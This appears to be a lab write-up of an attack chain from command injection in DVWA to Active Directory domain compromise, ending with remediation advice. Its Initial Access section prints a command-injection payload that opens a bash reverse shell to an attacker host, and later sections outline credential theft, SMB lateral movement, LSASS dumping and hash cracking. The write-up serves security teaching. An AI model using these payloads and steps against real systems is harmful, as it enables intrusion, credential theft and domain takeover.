# Overview

This lab demonstrates a complete attack chain from a vulnerable web application to Active Directory domain compromise.

The attack begins from DVWA hosted on an Ubuntu server (192.168.203.130), where command injection is exploited to gain initial access. A reverse shell is established to obtain credentials from the system.
Using the compromised credentials, the attacker performs SMB authentication to access a dual-homed Windows workstation, which serves as a pivot point into the internal network.
Once inside, the attacker enumerates the Domain Controller, extracts credentials from LSASS memory, and performs offline cracking using hashcat to obtain Domain Admin privileges.
This attack chain highlights the risks of credential reuse and improper network segmentation.

# Lab Environment

The lab environment is built using VMware Workstation to simulate a simplified enterprise network.

The environment consists of the following systems:

- Kali Linux (attacker)
- Ubuntu (hosting DVWA as the initial target)
- Windows 10 (dual-homed workstation acting as a pivot point)
- Windows Server 2022 (Domain Controller)

The network is divided into two segments:

- External Network: 192.168.203.0/24
- Internal Network: 192.168.88.0/24

The Ubuntu server is only connected to the external network and cannot directly access internal resources, but can resolve the Domain Controller via DNS.
The Windows 10 workstation is connected to both networks, acting as a bridge between external and internal environments.
This setup simulates a realistic attack scenario where an attacker compromises a web application and moves laterally into the internal network to gain control of the Domain Controller.

# Attack Chain

The following diagram illustrates the overall attack flow:

<p align="center">
  <img src="../evidence/core/attack-path.png" alt="Attack Diagram">
</p>

The attack begins from an external attacker (Kali), targeting the DVWA application hosted on Ubuntu via command injection. This allows execution of system commands and the establishment of a reverse shell for initial access.
After gaining access, credentials are extracted from the system (e.g., .env file). These credentials are then reused to authenticate via SMB, allowing access to a dual-homed Windows workstation.
The workstation acts as a pivot point, enabling the attacker to move from the external network into the internal network.
Once inside, the attacker targets the Domain Controller, extracts credentials from LSASS memory, and performs offline cracking to obtain Domain Admin privileges.

# Initial Access

## Description

The attacker exploited a command injection vulnerability in the DVWA application to gain system-level command execution.

## Method

User input was not properly validated, allowing command separators (e.g., `;`) to be injected and executed by the backend system.
A reverse shell was then established to obtain remote access to the target host.

## Example Payloads

```bash
127.0.0.1; whoami
127.0.0.1; bash -i >& /dev/tcp/192.168.203.131/4444 0>&1
```

## Evidence

Command Injection request and response:

<p align="center">
  <img src="../evidence/core/command-injection-request-response.png" alt="Request+Response">
</p>

Reverse shell session (whoami / id):

<p align="center">
  <img src="../evidence/core/reverse-shell.png" alt="Reverse Shell">
</p>

## Result

The attacker successfully obtained a shell on the target system (running as `www-data`), establishing an initial foothold for further exploitation.

# Credential Access

## Description

After gaining access to the web server, the attacker identified exposed configuration files containing sensitive credentials.

## Method

Using the obtained shell access, the attacker enumerated the web directory and discovered a `.env` file and backup files.

Credentials were extracted from:

- `/var/www/html/.env`
- `/var/www/html/backup/`

## Evidence

<p align="center">
  <img src="../evidence/core/exposed-env-file.png" alt="file">
</p>

The following credentials were observed:

- DB_USER=lab\svc-sql
- DB_PASS=P@ssw0rd123!

The same account (`svc-sql`) was also found in backup files, indicating potential credential reuse.

## Result

Valid credentials (`svc-sql`) were obtained, and credential reuse was confirmed, enabling further lateral movement via SMB authentication.

# Lateral Movement

## Description

The attacker used the credentials obtained from the web server (`svc-sql`) to authenticate against other systems.

## Method

Using crackmapexec, SMB authentication was performed against the external Windows host (192.168.203.132).

## Evidence

<p align="center">
  <img src="../evidence/core/win10-smb-pwned.png" alt="View Screenshot">
</p>

Observed:

- Successful authentication
- `(Pwn3d!)` indicating sufficient privileges

## Result

Access to the Windows workstation was obtained, establishing a foothold for further pivoting.

# Internal Pivot

## Description

The compromised Windows workstation was used as a pivot point to access the internal network.

## Method

Remote commands (e.g., `ipconfig`) were executed via crackmapexec to identify network interfaces.

## Evidence

<p align="center">
  <img src="../evidence/core/win10-ipconfig.png" alt="Win10 ipconfig">
</p>

Observed:

- External IP: 192.168.203.132
- Internal IP: 192.168.88.110

This confirms the host is dual-homed.

Additionally:

<p align="center">
  <img src="../evidence/core/win10-ping-dc.png" alt="Win10 ping DC">
</p>

Successful connectivity to the Domain Controller (192.168.88.100)

## Result

The attacker gained access to the internal network via the pivot host.

# Credential Dumping

## Description

After gaining control of the Windows host, the attacker extracted credentials from memory.

## Method

The `--lsa` module in crackmapexec was used to dump credentials from LSASS.

## Evidence

<p align="center">
  <img src="../evidence/core/lsass-dump.png" alt="LSASS">
</p>

Observed:

- Multiple NTLM hashes
- Includes Administrator account

## Result

Credential hashes were successfully obtained for further exploitation.

# Privilege Escalation

## Description

The attacker performed offline cracking on the extracted credential hashes to obtain plaintext passwords.

## Method

Hashcat was used to crack NTLM hashes.

## Evidence

<p align="center">
  <img src="../evidence/core/hashcat-cracking.png" alt="hashcat">
</p>

Recovered:

- Administrator password: NewPassword123

Verification:

<p align="center">
  <img src="../evidence/core/dc-smb-pwned.png" alt="View Screenshot">
</p>

Observed:

- Successful authentication to Domain Controller
- `(Pwn3d!)`
- whoami: lab\administrator

## Result

Full Domain Admin privileges were obtained, resulting in complete compromise of the Active Directory environment.

# Impact

This attack chain demonstrates a full compromise from a web application to Active Directory.
By exploiting an initial vulnerability, the attacker gains system access, extracts sensitive credentials, and performs lateral movement through credential reuse.
Once Domain Admin privileges are obtained, the attacker can:

- Access all systems and data within the domain
- Establish persistence through backdoor accounts
- Modify or delete critical data (Integrity impact)
- Access sensitive information (Confidentiality impact)
- Disrupt services (Availability impact)

This represents a complete compromise of the enterprise environment.

# Remediation

To mitigate such attacks, the following measures are recommended:

1. Input Validation
   - Sanitize and validate all user inputs
   - Avoid direct execution of user input in system commands

2. Sensitive Data Protection
   - Do not store credentials in publicly accessible files (e.g., .env)
   - Restrict access to configuration files

3. Credential Management
   - Avoid credential reuse across systems
   - Use dedicated service accounts

4. Least Privilege Principle
   - Limit privileges of service accounts
   - Avoid running services with high privileges

5. Network Segmentation
   - Isolate web servers from internal networks
   - Avoid dual-homed systems acting as bridges

6. Monitoring and Detection
   - Implement EDR/SIEM solutions
   - Detect abnormal authentication and lateral movement
